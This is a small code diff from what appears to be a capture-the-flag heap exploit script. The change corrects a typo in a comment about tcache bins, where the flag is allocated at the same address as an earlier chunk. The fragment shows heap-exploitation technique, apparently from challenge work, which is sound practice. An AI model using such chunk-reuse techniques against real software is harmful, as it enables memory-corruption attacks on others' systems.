@@ -297,7 +297,7 @@ def exploit(io, libc=null):
     # Tcachebins [0x80]: CHUNK_1
     # Call malloc 1 more times (to store the flag)
     # Tcachebins [0x80]: -
-    # Flag is has the same address as CHUNK_1
+    # Flag has the same address as CHUNK_1
     io.sendlineafter(b"> ", b"4")
 
 
